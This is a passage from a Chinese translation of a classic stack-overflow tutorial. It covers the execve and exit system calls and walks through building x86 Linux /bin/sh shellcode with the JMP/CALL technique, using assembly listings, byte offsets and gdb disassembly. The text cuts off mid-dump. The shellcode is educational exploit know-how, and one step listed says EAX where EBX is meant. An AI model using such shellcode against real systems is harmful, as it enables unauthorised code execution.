这个调用指令把IP(指令指针)压入堆栈中.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 现在到了execve(). 要注意我们使用的是基于Intel的Linux系统. 系统调用的细节随<BR>操作系统和CPU的不同而不同. 有的把参数压入堆栈中, 有的保存在寄存器里. 有的使用<BR>软中断跳入内核模式, 有的使用远调用(far call). Linux把传给系统调用的参数保存在<BR>寄存器里, 并且使用软中断跳入内核模式.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>------------------------------------------------------------------------------<BR>0x80002bc &lt;__execve&gt;:&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x80002bd &lt;__execve+1&gt;: movl&nbsp;&nbsp; %esp,%ebp<BR>0x80002bf &lt;__execve+3&gt;: pushl&nbsp; %ebx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例程的准备工作.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x80002c0 &lt;__execve+4&gt;: movl&nbsp;&nbsp; $0xb,%eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把0xb(十进制的11)放入寄存器EAX中(原文误为堆栈). 0xb是系统调用表的索引<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11就是execve.<BR><BR>0x80002c5 &lt;__execve+9&gt;: movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把"/bin/sh"的地址放到寄存器EBX中.<BR><BR>0x80002c8 &lt;__execve+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xc(%ebp),%ecx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把name[]的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x80002cb &lt;__execve+15&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x10(%ebp),%edx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把空指针的地址放到寄存器EDX中.<BR><BR>0x80002ce &lt;__execve+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进入内核模式.<BR>------------------------------------------------------------------------------&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp; 由此可见调用execve()也没有什么太多的工作要做, 所有要做的事情总结如下:<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a) 把以NULL结尾的字串"/bin/sh"放到内存某处.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)<BR>.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c) 把0xb放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d) 把字串"/bin/sh"的地址放到寄存器EBX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (注: 原文d和e步骤把EBX和ECX弄反了)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f) 把空长字的地址放到寄存器EDX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g) 执行指令int $0x80. <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 但是如果execve()调用由于某种原因失败了怎么办? 程序会继续从堆栈中读取指令, <BR>这时的堆栈中可能含有随机的数据! 程序执行这样的指令十有八九会core dump. 如果execv<BR>e<BR>调用失败我们还是希望程序能够干净地退出. 为此必须在调用execve之后加入一个exit<BR>系统调用. exit系统调用在汇编语言看起来象什么呢?<BR><BR>exit.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>void main() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o exit -static exit.c<BR>[aleph1]$ gdb exit<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(no debugging symbols found)...<BR>(gdb) disassemble _exit<BR>Dump of assembler code for function _exit:<BR>0x800034c &lt;_exit&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x800034d &lt;_exit+1&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x800034f &lt;_exit+3&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebx<BR>0x8000350 &lt;_exit+4&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,%eax<BR>0x8000355 &lt;_exit+9&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR>0x8000358 &lt;_exit+12&gt;:&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x800035a &lt;_exit+14&gt;:&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffffc(%ebp),%ebx<BR>0x800035d &lt;_exit+17&gt;:&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x800035f &lt;_exit+19&gt;:&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x8000360 &lt;_exit+20&gt;:&nbsp;&nbsp; ret<BR>0x8000361 &lt;_exit+21&gt;:&nbsp;&nbsp; nop<BR>0x8000362 &lt;_exit+22&gt;:&nbsp;&nbsp; nop<BR>0x8000363 &lt;_exit+23&gt;:&nbsp;&nbsp; nop<BR>End of assembler dump.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 系统调用exit会把0x1放到寄存器EAX中, 在EBX中放置退出码, 并且执行"int 0x80".<BR>就这些了! 大多数应用程序在退出时返回0, 以表示没有错误. 我们在EBX中也放入0. 现<BR>在我们构造shell code的步骤就是这样的了:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a) 把以NULL结尾的字串"/bin/sh"放到内存某处.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)<BR>.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c) 把0xb放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d) 把字串"/bin/sh"的地址放到寄存器EBX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (注: 原文d和e步骤把EBX和ECX弄反了)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f) 把空长字的地址放到寄存器EDX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g) 执行指令int $0x80.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; h) 把0x1放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i) 把0x0放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j) 执行指令int $0x80.&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 试着把这些步骤变成汇编语言, 把字串放到代码后面. 别忘了在数组后面放上字串<BR>地址和空字, 我们有如下的代码:<BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; string_addr,string_addr_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,null_byte_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,null_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; string_addr,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; string_addr,%ecx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; null_string,%edx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /bin/sh string goes here.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 问题是我们不知道在要破解的程序的内存空间中, 上述代码(和其后的字串)会被放到<BR>哪里. 一种解决方法是使用JMP和CALL指令. JMP和CALL指令使用相对IP的寻址方式, 也就<BR>是说我们可以跳到距离当前IP一定间距的某个位置, 而不必知道那个位置在内存中的确切<BR>地址. 如果我们在字串"/bin/sh"之前放一个CALL指令, 并由一个JMP指令转到CALL指令上.<BR>当CALL指令执行的时候, 字串的地址会被作为返回地址压入堆栈之中. 我们所需要的就是<BR>把返回地址放到一个寄存器之中. CALL指令只是调用我们上述的代码就可以了. 假定J代<BR>表JMP指令, C代表CALL指令, s代表字串, 执行过程如下所示:<BR><BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^|^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |||_____________||____________| (1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2)&nbsp; ||_____________||<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |______________| (3)<BR><BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 运用上述的修正方法, 并使用相对索引寻址, 我们代码中每条指令的字节数目如下:<BR>&nbsp;&nbsp;&nbsp; <BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; offset-to-call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,array-offset(%esi)&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,nullbyteoffset(%esi)# 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,null-offset(%esi)&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; array-offset(%esi),%ecx&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; null-offset(%esi),%edx&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; offset-to-popl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /bin/sh string goes here.<BR>------------------------------------------------------------------------------<BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp; 通过计算从jmp到call, 从call到popl, 从字串地址到数组, 从字串地址到空长字的<BR>偏量, 我们得到:<BR><BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x26&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x2b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 这看起来很不错了. 为了确保代码能够正常工作必须编译并执行. 但是还有一个问题.<BR>我们的代码修改了自身, 可是多数操作系统将代码页标记为只读. 为了绕过这个限制我们<BR>必须把要执行的代码放到堆栈或数据段中, 并且把控制转到那里. 为此应该把代码放到数<BR>据段中的全局数组中. 我们首先需要用16进制表示的二进制代码. 先编译, 然后再用gdb<BR>来取得二进制代码.<BR><BR><BR>shellcodeasm.c<BR>------------------------------------------------------------------------------<BR>void main() {<BR>__asm__("<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x2a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x2f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c<BR>[aleph1]$ gdb shellcodeasm<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 